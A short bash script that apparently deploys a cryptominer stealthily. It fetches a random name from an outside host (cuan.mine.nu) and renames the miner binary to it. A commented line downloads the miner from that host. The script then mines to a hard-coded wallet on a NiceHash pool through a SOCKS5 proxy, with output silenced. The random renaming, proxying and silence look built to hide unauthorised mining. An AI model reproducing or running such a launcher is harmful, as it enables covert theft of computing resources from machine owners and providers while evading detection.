#!/bin/bash
#wget https://cuan.mine.nu/nbminer
ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
chmod +x bubui && mv bubui $ACAK
read PROXY
WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
#WORKER2=$(date '+%d%b')
#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
